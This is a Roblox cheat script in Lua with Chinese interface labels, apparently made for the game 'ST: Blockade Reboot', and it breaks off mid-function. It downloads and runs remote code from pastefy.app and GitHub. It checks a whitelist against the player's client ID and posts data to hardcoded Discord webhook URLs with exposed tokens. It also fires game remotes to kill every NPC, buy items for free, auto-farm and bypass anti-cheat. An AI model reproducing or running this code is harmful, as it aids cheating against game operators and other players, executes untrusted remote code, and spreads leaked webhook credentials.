if run == true then
  error("中断")
end
pcall(function() getgenv().run = true end)
-----------------------------------------------------
local function hook(Target, text)
  hookfunction(Target, function(...)
      game.Players.LocalPlayer:Kick(text)
      while true do
         game:Shutdown()
      end
  end)
end
wait(0.02)
hook(hookfunction, "lol")
-----------------------------------------------------
local function isRealPlayer(player)
    for _, p in ipairs(game.Players:GetPlayers()) do
        if p == player then
            return true
        end
    end
    return false
end
-----------------------------------------------------
local httpstext = "https://"
local rawtext = "raw"
local httpplayer = loadstring(game:HttpGet(httpstext.."pastefy.app/d3FI03rJ/"..rawtext))()
--白名单-白名单
-----------------------------------------------------
local HTTPHWID = game:GetService("RbxAnalyticsService"):GetClientId()
local localPlayer = game.Players.LocalPlayer
local function checkPermissions()
    local PlayerTrue = false
    if httpplayer[localPlayer.Name] then
        if httpplayer[localPlayer.Name].UserID == localPlayer.UserId then
            if localPlayer.Character and localPlayer.Character.Name == localPlayer.Name then
               if isRealPlayer(localPlayer) then
                  PlayerTrue = true
               end
            end
        end
    end
    return PlayerTrue
end
local PlayerTrue = checkPermissions()
--检测系统--检测系统
---------------------------------------------------
local discordtext = "discord.com/api/webhooks"
local function webhook(data, webhookUrl)
      local httpService = game:GetService("HttpService")
      httpService:RequestAsync({
            Url = webhookUrl,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = httpService:JSONEncode(data)
      })
end
-----------------------------------------------------
if not PlayerTrue then
    game.Players.LocalPlayer:Kick("You has been banned Reason：hack")
    wait(0.1)
    while true do
        game:Shutdown()
    end
end

if not PlayerTrue then
local text = loadstring(game:HttpGet(httpstext.."pastefy.app/Mr0FNDNa/"..rawtext))()
local weburl = httpstext..discordtext.."/1382575425221300314/wHDKtRqRWdRlHooXgyCWUpjrS5SgpgO9WlVb8JQxN8Yiz0rREl6bvhO9Nt1jwIP_jElM"
webhook(text, weburl)
error("error")
end
---------------------------------------------------
repeat wait() until PlayerTrue

if PlayerTrue then
local text = loadstring(game:HttpGet(httpstext.."pastefy.app/95koT34A/"..rawtext))()
local weburl = httpstext..discordtext.."/1382575262520184872/0ljnnytmeOr3K37sUfh-TFrz9sTgSoIKedwMx0OIgnHnIchQ7-Ya2Sj5JT17p5T_s6_C"
webhook(text, weburl)
end
-----------------------------------------------------
--主要的脚本内容
if PlayerTrue then
local WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()


--编辑
local Window = WindUI:CreateWindow({
    Title = "STBB",
    Icon = "app-window",
    Author = "This file was protected with MoonSec V3",
    Folder = "STBB",
    Size = UDim2.fromOffset(580, 380),
    Transparent = true,
    Theme = "Dark",
    SideBarWidth = 140,
    Background = "",
    User = {
        Enabled = false,
        Anonymous = true,
        Callback = function()
            print("clicked")
        end,
    },
})

WindUI:SetNotificationLower(true)

Window:EditOpenButton({
    Title = "\t",
    Icon = "app-window",
    CornerRadius = UDim.new(0,8),
    StrokeThickness = 0,
    Color = ColorSequence.new( -- gradient
        Color3.fromHex("FF0F7B"), 
        Color3.fromHex("F89B29")
    ),
    --Enabled = false,
    Draggable = true,
})

--窗口顶部按钮
Window:CreateTopbarButton("重置角色", "bird",    function() replicatesignal(game:GetService("Players").LocalPlayer.Kill) end,  990)

Window:DisableTopbarButtons({
    "Close", 
    "Fullscreen",
})

--左边选择
local Tabs = {
   Announcement_Updates = Window:Tab({ Title = "公告_更新", Icon = "info" }),
   maincontent = Window:Tab({ Title = "主要内容", Icon = "type" }),
   Remotestore = Window:Tab({ Title = "远程商店", Icon = "message-square" }),
   genericscript = Window:Tab({ Title = "通用脚本", Icon = "code" }),
   switchroles = Window:Tab({ Title = "切换角色", Icon = "mouse-pointer-2", }),
   playergui = Window:Tab({ Title = "页面类别", Icon = "app-window-mac", }),
}

--公告和更新

Tabs.Announcement_Updates:Paragraph({
    Title = "声明",
    Desc = "如果你的账号因为使用此脚本，受到警告，封禁，此脚本作者不承担责任(默认同意)",
    Color = "Red",
    Locked = false,
    Image = "https://play-lh.googleusercontent.com/7cIIPlWm4m7AGqVpEsIfyL-HW4cQla4ucXnfalMft1TMIYQIlf2vqgmthlZgbNAQoaQ",
    Buttons = {
        {
            Icon = "bird",
            Title = "不同意",
            Callback = function() game.Players.LocalPlayer:Kick("") end,
        }
    }
})

Tabs.Announcement_Updates:Paragraph({
    Title = "使用说明",
    Desc = "禁止透露此脚本，禁止截屏泄露此脚本，禁止在公服使用",
    Color = "Red",
    Image = "https://play-lh.googleusercontent.com/7cIIPlWm4m7AGqVpEsIfyL-HW4cQla4ucXnfalMft1TMIYQIlf2vqgmthlZgbNAQoaQ",
    Locked = false,
    Buttons = {
        {
            Icon = "bird",
            Title = "不同意",
            Callback = function() game.Players.LocalPlayer:Kick("") end,
        }
    }
})

local update = [[
-增加窗口顶部快捷重置
________________________________]]

Tabs.Announcement_Updates:Paragraph({
    Title = "更新公告",
    Desc = update,
    Color = "Red",
    Image = "https://play-lh.googleusercontent.com/7cIIPlWm4m7AGqVpEsIfyL-HW4cQla4ucXnfalMft1TMIYQIlf2vqgmthlZgbNAQoaQ",
    Locked = false,
})

--主要内容

function reset()
       replicatesignal(game:GetService("Players").LocalPlayer.Kill)
end


Tabs.maincontent:Button({
    Title = "重置角色",
    Desc = nil,
    Locked = false,
    Callback = function()
     reset()
    end
})


local PlayerCharacter = game:GetService("Players").LocalPlayer.Character
local Deathreset = false
game:GetService('RunService').RenderStepped:connect(function()
 if Deathreset == true then
   if PlayerCharacter:FindFirstChild("Timer") then
      reset()
   end
 end
end)

Tabs.maincontent:Toggle({
    Title = "死亡重置",
    Desc = "",
    Locked = false,
    Value = false,
    Callback = function(Value)
        if Value then
           Deathreset = true
        else
           Deathreset = false
        end
    end
})

Tabs.maincontent:Button({
	Title = "传送最近马桶",
	Desc = nil,
	Locked = false,
    	Callback = function()
-- Auto Farm for ST: Blockade Reboot
-- Bypasses Anti-Cheat, Instantly Teleports, and Attacks NPCs
-- WARNING: Use at your own risk!

local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/wizard"))()
local Window = Library:NewWindow("Auto Farm")
local Section = Window:NewSection("Options")

local autoFarmActive = false

Section:CreateToggle("Auto Farm", function(value)
    autoFarmActive = value
    if autoFarmActive then
        startAutoFarm()
    end
end)

function startAutoFarm()
    spawn(function()
        while autoFarmActive do
            pcall(function()
                local player = game.Players.LocalPlayer
                local char = player.Character or player.CharacterAdded:Wait()
                local hrp = char:FindFirstChild("HumanoidRootPart")
                
                if char and hrp then
                    local target = findClosestAliveNPC(5000, hrp)
                    
                    if target and target:FindFirstChild("HumanoidRootPart") then
                        -- Instant teleport directly above the NPC
                        hrp.CFrame = target.HumanoidRootPart.CFrame * CFrame.new(0, 3, 0)
                        attackNPC(target)
                    end
                end
            end)
            wait(0.05) -- Faster reaction time
        end
    end)
end

function attackNPC(npc)
    pcall(function()
        if npc and npc:FindFirstChild("Humanoid") and npc.Humanoid.Health > 0 then
            local tool = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool")
            if tool then
                tool:Activate()
            end
        end
    end)
end

function findClosestAliveNPC(maxDistance, part)
    local lastDist = maxDistance
    local closest = nil

    for _, v in pairs(workspace:GetDescendants()) do
        if v:IsA("Model") and v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") then
            local hum = v:FindFirstChild("Humanoid")
            if hum and hum.Health > 0 and not game.Players:GetPlayerFromCharacter(v) then
                local thisDist = (v.HumanoidRootPart.Position - part.Position).Magnitude
                if thisDist < lastDist then
                    closest = v
                    lastDist = thisDist
                end
            end
        end
    end
    return closest
end

    end
})



local DeathLaser = false
local isToggled = false
local button = Instance.new("TextButton")
button.Text = "死亡激光"
button.Position = UDim2.new(0.5, 0, 1, -30)
button.Size = UDim2.new(0, 50, 0, 25)
button.Visible = true
button.Font = Enum.Font.SourceSansBold
button.Draggable = true
button.TextSize = 18
button.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
button.TextColor3 = Color3.fromRGB(255, 255, 255)
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "Deathlaser"
screenGui.Parent = gethui()
button.Parent = screenGui
local function updateButtonUI()
     if isToggled then
         button.Text = "关闭"
         button.BackgroundColor3 = Color3.new(0.2, 0.8, 0.2)
     else
         button.Text = "开启"
         button.BackgroundColor3 = Color3.new(0.8, 0.2, 0.2)
     end
end

button.MouseButton1Click:Connect(function()
      isToggled = not isToggled
      DeathLaser = isToggled
      updateButtonUI()
        
end)

task.spawn(function()
      while true do
         if DeathLaser then
            local args = {
                        vector.create(194.2252655029297, -283.3617248535156, -938.0745239257812)
                    }
                    game:GetService("ReplicatedStorage"):WaitForChild("VillanArcGasterBlaster"):FireServer(unpack(args))
         end
      task.wait()
      end
end)
gethui().Deathlaser.Enabled = false

Tabs.maincontent:Toggle({
    Title = "死亡激光",
    Desc = nil,
    Value = false,
    Locked = false,
    Callback = function(Value)
      if Value then
        gethui().Deathlaser.Enabled = true
      else
        gethui().Deathlaser.Enabled = false
      end
    end
})

local Automaticinteraction = false
Tabs.maincontent:Toggle({
    Title = "自动互动",
    Desc = nil,
    Value = false,
    Locked = false,
    Callback = function(Value)
      if Value then
          Automaticinteraction = true
          while Automaticinteraction do
          wait(0.000001)
              for i,d in pairs(game:GetService("Workspace"):GetDescendants()) do
                if d.ClassName == 'ProximityPrompt' then
                   fireproximityprompt(d)
                end
              end
          end
      else
          Automaticinteraction = false
      end
    end
})

local Killboss = false
Tabs.maincontent:Toggle({
    Title = "秒杀boss",
    Desc = nil,
    Value = false,
    Locked = false,
    Callback = function(Value)
      if Value then
          Killboss = true
          game:GetService('RunService').RenderStepped:connect(function()
           wait(0.0001)
            for i,d in pairs(game:GetService("Workspace"):GetDescendants()) do
              if d.ClassName == 'Humanoid' and d.Parent.Name ~= game.Players.LocalPlayer.Name then
                if Killboss == true then
                  d.Health = 0
                end
              end
            end
          end)
      else
          Killboss = false
      end
    end
})

local crosshair = false
Tabs.maincontent:Toggle({
    Title = "准心调整",
    --Image = "bird",
    Value = false,
    Callback = function(state)
        if state then
            crosshair = true
            while crosshair do
                local Players = game:GetService("Players")
                local LocalPlayer = Players.LocalPlayer
                local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
                local ShiftLock = PlayerGui:WaitForChild("ShiftLock")
                local MiddleIcon = ShiftLock.Frame:WaitForChild("MiddleIcon")
                MiddleIcon.Size = UDim2.new(0.0200000033, 0, 0.204999968, 0)
                MiddleIcon.Position = UDim2.new(0.5, 0, 0.5, 0) 
                wait(1)
            end
        else
            crosshair = false
        end
    end
})

local Unlimitedpause = false
Tabs.maincontent:Toggle({
    Title = "无限暂停",
    Desc = nil,
    Value = false,
    Locked = false,
    Callback = function(Value)
       if Value then
          Unlimitedpause = true
          while Unlimitedpause do
            game:GetService("ReplicatedStorage"):WaitForChild("TimeStops"):FireServer()
            wait(1 / 3000)
          end
       else
          Unlimitedpause = false
       end
    end
})


local function startESPSystem(target_select, targetname, switch)
    -- 创建ESP标签的函数
    local function createESPLabelForTarget(target)
        if target then
            -- 检查目标上是否已经有ESP标签
            local hasESP = false
            for _, child in ipairs(target:GetChildren()) do
                if child:IsA("BillboardGui") and child.Name == "ESPBillboard" then
                    hasESP = true
                    break
                end
            end

            -- 如果目标上没有ESP标签，则添加标签并提示
            if not hasESP then
                -- 使用模型本身
                local adornee = target

                -- 创建一个BillboardGui来显示ESP文字
                local billboardGui = Instance.new("BillboardGui")
                billboardGui.Name = "ESPBillboard"
                billboardGui.Size = UDim2.new(0, 200, 0, 50)
                billboardGui.AlwaysOnTop = true
                billboardGui.Adornee = adornee
                billboardGui.Parent = target -- 将BillboardGui设置为目标的子对象

                -- 创建一个TextLabel来显示文字
                local textLabel = Instance.new("TextLabel")
                textLabel.Name = "ESPText"
                textLabel.Text = targetname
                textLabel.Font = Enum.Font.SourceSansBold
                textLabel.TextSize = 20
                textLabel.TextColor3 = Color3.new(1, 0, 0) -- 红色文字
                textLabel.BackgroundTransparency = 1
                textLabel.Size = UDim2.new(1, 0, 1, 0)
                textLabel.Parent = billboardGui

                -- 触发通知
                WindUI:Notify({
                    Title = targetname .. "出现",
                    Content = nil,
                    Duration = 5,
                })
            end
        end
    end

    -- 检测目标并创建ESP标签
    local function checkTargets()
        -- 假设目标模型位于workspace中
        local target = workspace:FindFirstChild(target_select)
        if target then
            createESPLabelForTarget(target)
        end
    end

    while switch.Value do
      wait(0.01)
      checkTargets()
    end

end


Tabs.maincontent:Button({
    Title = "雷达检测",
    Desc = nil,
    Callback = function()
        local espLabels = {}
        local detectedTransmitters = {}

        local function createESPLabelForTransmitter(transmitterToilet)
            if transmitterToilet and not espLabels[transmitterToilet] then
                local adornee = transmitterToilet:FindFirstChildWhichIsA("BasePart") or transmitterToilet

                local billboardGui = Instance.new("BillboardGui")
                billboardGui.Name = "ESPBillboard"
                billboardGui.Size = UDim2.new(0, 200, 0, 50)
                billboardGui.AlwaysOnTop = true
                billboardGui.Adornee = adornee
                billboardGui.Parent = game:GetService("CoreGui")

                local textLabel = Instance.new("TextLabel")
                textLabel.Name = "ESPText"
                textLabel.Text = "雷达"
                textLabel.Font = Enum.Font.SourceSansBold
                textLabel.TextSize = 20
                textLabel.TextColor3 = Color3.new(1, 0, 0) 
                textLabel.BackgroundTransparency = 1
                textLabel.Size = UDim2.new(1, 0, 1, 0)
                textLabel.Parent = billboardGui

                espLabels[transmitterToilet] = billboardGui
            end
        end

        local function checkTransmitterToilets()
            local livingFolder = workspace:FindFirstChild("Living")
            if livingFolder then
                local transmitterToilets = livingFolder:GetChildren()
                for _, transmitterToilet in ipairs(transmitterToilets) do
                    if transmitterToilet.Name == "Transmitter toilet" and not detectedTransmitters[transmitterToilet] then
                        createESPLabelForTransmitter(transmitterToilet)
                        WindUI:Notify({
                          Title = "雷达出现",
                          Content = nil,
                          Duration = 5,
                        })
                        detectedTransmitters[transmitterToilet] = true
                    end
                end
            end

            for transmitterToilet, billboardGui in pairs(espLabels) do
                if not transmitterToilet.Parent then
                    billboardGui:Destroy()
                    espLabels[transmitterToilet] = nil
                    detectedTransmitters[transmitterToilet] = nil
                end
            end
        end

        local function startChecking()
            while wait() do
                checkTransmitterToilets()
            end
        end

        startChecking()
    end
})



Tabs.maincontent:Button({
    Title = "时钟检测",
    Desc = nil,
    Callback = function()
       local clockspider = true
       task.spawn(function() startESPSystem("Clock Spider", "时钟蜘蛛", clockspider) end)
    end
})

local Keycard = { Value = false }
local Udisk6 = { Value = false }
local Udisk5 = { Value = false }
local Udisk4 = { Value = false }
local Udisk3 = { Value = false }
local Udisk2 = { Value = false }
local Udisk1 = { Value = false }
Tabs.maincontent:Dropdown({
    Title = "闪光U盘",
    Values = { "U盘1", "U盘2", "U盘3", "U盘4", "U盘5", "U盘6", "门禁卡"},
    Value = {},
    Multi = true,
    AllowNone = true,
    Callback = function(option) 
        if table.find(option, "U盘1") then
            Udisk1.Value = true
            task.spawn(function() startESPSystem("Flash Drive #1", "U盘1", Udisk1) end)
        else
            Udisk1.Value = false
        end

        if table.find(option, "U盘2") then
            Udisk2.Value = true
            task.spawn(function() startESPSystem("Flash Drive #2", "U盘2", Udisk2) end)
        else
            Udisk2.Value = false
        end

        if table.find(option, "U盘3") then
            Udisk3.Value = true
            task.spawn(function() startESPSystem("Flash Drive #3", "U盘3", Udisk3) end)
        else
            Udisk3.Value = false
        end
        
        if table.find(option, "U盘4") then
            Udisk4.Value = true
            task.spawn(function() startESPSystem("Flash Drive #4", "U盘4", Udisk4) end)
        else
            Udisk4.Value = false
        end
        
        if table.find(option, "U盘5") then
            Udisk5.Value = true
            task.spawn(function() startESPSystem("Flash Drive #5", "U盘5", Udisk5) end)
        else
            Udisk5.Value = false
        end
        
        if table.find(option, "U盘6") then
            Udisk6.Value = true
            task.spawn(function() startESPSystem("Flash Drive #6", "U盘6", Udisk6) end)
        else
            Udisk6.Value = false
        end
        
        if table.find(option, "门禁卡") then
            Keycard.Value = true
            task.spawn(function() startESPSystem("Keycard", "门禁卡", Keycard) end)
        else
            Keycard.Value = false
        end
    end
})


local DriveSdFE0 = { Value = false }
local DriveA = { Value = false }
local DriveB = { Value = false }
local DriveC = { Value = false }
local DriveD = { Value = false }
local DriveE = { Value = false }
Tabs.maincontent:Dropdown({
    Title = "紫色U盘",
    Values = { "U盘A", "U盘B", "U盘C", "U盘D", "传说中的_U盘E", "前置条件U盘"},
    Value = {},
    Multi = true,
    AllowNone = true,
    Callback = function(option) 
        if table.find(option, "U盘A") then
            DriveA.Value = true
            task.spawn(function() startESPSystem("Drive #A", "U盘A", DriveA) end)
        else
            DriveA.Value = false
        end
      
        if table.find(option, "U盘B") then
            DriveB.Value = true
            task.spawn(function() startESPSystem("Drive #B", "U盘B", DriveB) end)
        else
            DriveB.Value = false
        end
      
        if table.find(option, "U盘C") then
            DriveC.Value = true
            task.spawn(function() startESPSystem("Drive #C", "U盘C", DriveC) end)
        else
            DriveC.Value = false
        end
        
        if table.find(option, "U盘D") then
            DriveD.Value = true
            task.spawn(function() startESPSystem("Drive #D", "U盘D", DriveD) end)
        else
            DriveD.Value = false
        end
        
        if table.find(option, "传说中的_U盘E") then
            DriveE.Value = true
            task.spawn(function() startESPSystem("Drive #E", "U盘E", DriveE) end)
        else
            DriveE.Value = false
        end
        
        if table.find(option, "前置条件U盘") then
            DriveSdFE0.Value = true
            task.spawn(function() startESPSystem("Drive #SdFE0", "前置条件U盘", DriveSdFE0) end)
        else
            DriveSdFE0.Value = false
        end
    end
})

local function GachaSkins(Value, kaiguan)
   while kaiguan.Value do
      wait(0.001)
      local args = {
	      Value
      }
      game:GetService("ReplicatedStorage"):WaitForChild("GachaSkins"):FireServer(unpack(args))
   end
end

local GachaSkins1Spin = { Value = false }
local GachaSkins1SpinLucky = { Value = false }
local GachaSkins10Spins = { Value = false }

Tabs.maincontent:Dropdown({
    Title = "自动抽奖(皮肤)",
    Values = { "单抽", "十连", "幸运"},
    Value = {},
    Multi = true,
    AllowNone = true,
    Callback = function(option) 
        if table.find(option, "单抽") then
            GachaSkins1Spin.Value = true
            task.spawn(function() GachaSkins("1Spin", GachaSkins1Spin) end)
        else
            GachaSkins1Spin.Value = false
        end
      
        if table.find(option, "十连") then
            GachaSkins10Spins.Value = true
            task.spawn(function() GachaSkins("10Spins", GachaSkins10Spins) end)
        else
            GachaSkins10Spins.Value = false
        end
      
        if table.find(option, "幸运") then
            GachaSkins1SpinLucky.Value = true
            task.spawn(function() GachaSkins("1SpinLucky", GachaSkins1SpinLucky) end)
        else
            GachaSkins1SpinLucky.Value = false
        end
    end
})

--远程商店

Tabs.Remotestore:Button({
    Title = "满血返回",
    Desc = nil,
    Callback = function() 
local args = {
	"Buy",
	"FillHP"
}
game:GetService("ReplicatedStorage"):WaitForChild("ShopSystem"):FireServer(unpack(args))
game:GetService("ReplicatedStorage"):WaitForChild("ReturnToLobby"):FireServer()
    end
})


Tabs.Remotestore:Section({ 
    Title = "购买栏",
    TextXAlignment = "Left",
    TextSize = 17,
})


Tabs.Remotestore:Button({
	Title = "脉冲步枪",
	Desc = nil,
    	Callback = function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local ForChangeCharacter = ReplicatedStorage:WaitForChild("ForChangeCharacter")
local ShopSystem = ReplicatedStorage:WaitForChild("ShopSystem")

local PlayerValues = LocalPlayer:WaitForChild("PlayerValues") -- 确保 PlayerValues 加载完成
local CharacterValue = PlayerValues:WaitForChild("Character") -- 确保 Character 属性加载完成
local initialCharacterValue = CharacterValue.Value -- 记录初始角色值

local args1 = {
    [1] = "Camera man",
    [2] = 0
}
ForChangeCharacter:FireServer(unpack(args1))

wait(0.0001)

local args2 = {
    [1] = "Buy",
    [2] = "Pulse Rifle"
}
ShopSystem:FireServer(unpack(args2))

wait(0.0001)

local args3 = {
    [1] = initialCharacterValue, -- 使用记录的初始角色值
    [2] = 0
}
ForChangeCharacter:FireServer(unpack(args3))



    end
})

Tabs.Remotestore:Button({
	Title = "眼镜",
	Desc = nil,
    	Callback = function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local ForChangeCharacter = ReplicatedStorage:WaitForChild("ForChangeCharacter")
local ShopSystem = ReplicatedStorage:WaitForChild("ShopSystem")

local PlayerValues = LocalPlayer:WaitForChild("PlayerValues") -- 确保 PlayerValues 加载完成
local CharacterValue = PlayerValues:WaitForChild("Character") -- 确保 Character 属性加载完成
local initialCharacterValue = CharacterValue.Value -- 记录初始角色值

local args1 = {
    [1] = "Camera man",
    [2] = 0
}
ForChangeCharacter:FireServer(unpack(args1))

wait(0.0001)

local args2 = {
    [1] = "Buy",
    [2] = "Lens"
}
ShopSystem:FireServer(unpack(args2))

wait(0.0001)

local args3 = {
    [1] = initialCharacterValue, -- 使用记录的初始角色值
    [2] = 0
}
ForChangeCharacter:FireServer(unpack(args3))



    end
})

Tabs.Remotestore:Button({
	Title = "喷气背包",
	Desc = nil,
    	Callback = function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local ForChangeCharacter = ReplicatedStorage:WaitForChild("ForChangeCharacter")
local ShopSystem = ReplicatedStorage:WaitForChild("ShopSystem")

local PlayerValues = LocalPlayer:WaitForChild("PlayerValues") -- 确保 PlayerValues 加载完成
local CharacterValue = PlayerValues:WaitForChild("Character") -- 确保 Character 属性加载完成
local initialCharacterValue = CharacterValue.Value -- 记录初始角色值

local args1 = {
    [1] = "Camera man",
    [2] = 0
}
ForChangeCharacter:FireServer(unpack(args1))

wait(0.0001)

local args2 = {
    [1] = "Buy",
    [2] = "Jetpack"
}
ShopSystem:FireServer(unpack(args2))

wait(0.0001)

local args3 = {
    [1] = initialCharacterValue, -- 使用记录的初始角色值
    [2] = 0
}
ForChangeCharacter:FireServer(unpack(args3))



    end
})

Tabs.Remotestore:Button({
	Title = "铠甲",
	Desc = nil,
    	Callback = function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local ForChangeCharacter = ReplicatedStorage:WaitForChild("ForChangeCharacter")
local ShopSystem = ReplicatedStorage:WaitForChild("ShopSystem")

local PlayerValues = LocalPlayer:WaitForChild("PlayerValues") -- 确保 PlayerValues 加载完成
local CharacterValue = PlayerValues:WaitForChild("Character") -- 确保 Character 属性加载完成
local initialCharacterValue = CharacterValue.Value -- 记录初始角色值

local args1 = {
    [1] = "Camera man",
    [2] = 0
}
ForChangeCharacter:FireServer(unpack(args1))

wait(0.0001)

local args2 = {
    [1] = "Buy",
    [2] = "Armor"
}
ShopSystem:FireServer(unpack(args2))

wait(0.0001)

local args3 = {
    [1] = initialCharacterValue, -- 使用记录的初始角色值
    [2] = 0
}
ForChangeCharacter:FireServer(unpack(args3))



    end
})

Tabs.Remotestore:Button({
	Title = "耳机",
	Desc = nil,
    	Callback = function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local ForChangeCharacter = ReplicatedStorage:WaitForChild("ForChangeCharacter")
local ShopSystem = ReplicatedStorage:WaitForChild("ShopSystem")

local PlayerValues = LocalPlayer:WaitForChild("PlayerValues") -- 确保 PlayerValues 加载完成
local CharacterValue = PlayerValues:WaitForChild("Character") -- 确保 Character 属性加载完成
local initialCharacterValue = CharacterValue.Value -- 记录初始角色值

local args1 = {
    [1] = "Camera man",
    [2] = 0
}
ForChangeCharacter:FireServer(unpack(args1))

wait(0.0001)

local args2 = {
    [1] = "Buy",
    [2] = "HeadPhone"
}
ShopSystem:FireServer(unpack(args2))

wait(0.0001)

local args3 = {
    [1] = initialCharacterValue, -- 使用记录的初始角色值
    [2] = 0
}
ForChangeCharacter:FireServer(unpack(args3))



    end
})

Tabs.Remotestore:Button({
	Title = "EPD",
	Desc = nil,
    	Callback = function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local ForChangeCharacter = ReplicatedStorage:WaitForChild("ForChangeCharacter")
local ShopSystem = ReplicatedStorage:WaitForChild("ShopSystem")

local PlayerValues = LocalPlayer:WaitForChild("PlayerValues") -- 确保 PlayerValues 加载完成
local CharacterValue = PlayerValues:WaitForChild("Character") -- 确保 Character 属性加载完成
local initialCharacterValue = CharacterValue.Value -- 记录初始角色值

local args1 = {
    [1] = "Camera man",
    [2] = 0
}
ForChangeCharacter:FireServer(unpack(args1))

wait(0.0001)

local args2 = {
    [1] = "Buy",
    [2] = "EPD"
}
ShopSystem:FireServer(unpack(args2))

wait(0.0001)

local args3 = {
    [1] = initialCharacterValue, -- 使用记录的初始角色值
    [2] = 0
}
ForChangeCharacter:FireServer(unpack(args3))



    end
})

Tabs.Remotestore:Button({
	Title = "快速po枪",
	Desc = nil,
    	Callback = function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local ForChangeCharacter = ReplicatedStorage:WaitForChild("ForChangeCharacter")
local ShopSystem = ReplicatedStorage:WaitForChild("ShopSystem")

local PlayerValues = LocalPlayer:WaitForChild("PlayerValues") -- 确保 PlayerValues 加载完成
local CharacterValue = PlayerValues:WaitForChild("Character") -- 确保 Character 属性加载完成
local initialCharacterValue = CharacterValue.Value -- 记录初始角色值

local args1 = {
    [1] = "Camera man",
    [2] = 0
}
ForChangeCharacter:FireServer(unpack(args1))

wait(0.0001)

local args2 = {
    [1] = "Buy",
    [2] = "Shot Harpoon Gun"
}
ShopSystem:FireServer(unpack(args2))

wait(0.0001)

local args3 = {
    [1] = initialCharacterValue, -- 使用记录的初始角色值
    [2] = 0
}
ForChangeCharacter:FireServer(unpack(args3))



    end
})


Tabs.Remotestore:Button({
	Title = "快速po枪子弹(10次)",
	Desc = nil,
    	Callback = function()
for i = 1, 10 do
local args = {
	"Ammo",
	game:GetService("Players").LocalPlayer.Character:WaitForChild("Shot Harpoon Gun")
}
game:GetService("ReplicatedStorage"):WaitForChild("ShopSystem"):FireServer(unpack(args))
end
    end
})

local unli = false
Tabs.Remotestore:Toggle({
    Title = "快速po枪子弹(循环)",
    Desc = nil,
    Value = false,
    Callback = function(Value)
        if Value then
            unli = true
            while unli do
                 local args = {
               	"Ammo",
               	game:GetService("Players").LocalPlayer.Character:WaitForChild("Shot Harpoon Gun")
                 }
                 game:GetService("ReplicatedStorage"):WaitForChild("ShopSystem"):FireServer(unpack(args))
                wait(0.00002)
            end
        else
            unli = false
        end
    end
}, "Toggle")

Tabs.Remotestore:Button({
	Title = "散弹枪",
	Desc = nil,
    	Callback = function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local ForChangeCharacter = ReplicatedStorage:WaitForChild("ForChangeCharacter")
local ShopSystem = ReplicatedStorage:WaitForChild("ShopSystem")

local PlayerValues = LocalPlayer:WaitForChild("PlayerValues") -- 确保 PlayerValues 加载完成
local CharacterValue = PlayerValues:WaitForChild("Character") -- 确保 Character 属性加载完成
local initialCharacterValue = CharacterValue.Value -- 记录初始角色值

local args1 = {
    [1] = "Camera man",
    [2] = 0
}
ForChangeCharacter:FireServer(unpack(args1))

wait(0.0001)

local args2 = {
    [1] = "Buy",
    [2] = "Shot Gun"
}
ShopSystem:FireServer(unpack(args2))

local args2 = {
    [1] = "Buy",
    [2] = "Shot Gun"
}
ShopSystem:FireServer(unpack(args2))

wait(0.0001)

local args3 = {
    [1] = initialCharacterValue, -- 使用记录的初始角色值
    [2] = 0
}
ForChangeCharacter:FireServer(unpack(args3))



    end
})

Tabs.Remotestore:Button({
	Title = "散弹枪子弹(10次)",
	Desc = nil,
    	Callback = function()
for i = 1, 10 do
local args = {
	"Ammo",
	game:GetService("Players").LocalPlayer.Character:WaitForChild("Dual Shot Gun")
}
game:GetService("ReplicatedStorage"):WaitForChild("ShopSystem"):FireServer(unpack(args))
end
    end
})

local unli = false
Tabs.Remotestore:Toggle({
    Title = "散弹枪子弹(循环)",
    Desc = nil,
    Value = false,
    Callback = function(Value)
        if Value then
            unli = true
            while unli do
                 local args = {
               	"Ammo",
               	game:GetService("Players").LocalPlayer.Character:WaitForChild("Dual Shot Gun")
                 }
                 game:GetService("ReplicatedStorage"):WaitForChild("ShopSystem"):FireServer(unpack(args))
                wait(0.00002)
            end
        else
            unli = false
        end
    end
}, "Toggle")

Tabs.Remotestore:Button({
	Title = "镭射激光炮",
	Desc = nil,
    	Callback = function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local ForChangeCharacter = ReplicatedStorage:WaitForChild("ForChangeCharacter")
local ShopSystem = ReplicatedStorage:WaitForChild("ShopSystem")

local PlayerValues = LocalPlayer:WaitForChild("PlayerValues") -- 确保 PlayerValues 加载完成
local CharacterValue = PlayerValues:WaitForChild("Character") -- 确保 Character 属性加载完成
local initialCharacterValue = CharacterValue.Value -- 记录初始角色值

local args1 = {
    [1] = "Big Camera man",
    [2] = 0
}
ForChangeCharacter:FireServer(unpack(args1))

wait(0.0001)

local args2 = {
    [1] = "Buy",
    [2] = "Large Laser Gun"
}
ShopSystem:FireServer(unpack(args2))

wait(0.0001)

local args3 = {
    [1] = initialCharacterValue, -- 使用记录的初始角色值
    [2] = 0
}
ForChangeCharacter:FireServer(unpack(args3))



    end
})

--通用脚本

Tabs.genericscript:Button({
	Title = "飞行",
	Desc = nil,
    	Callback = function()
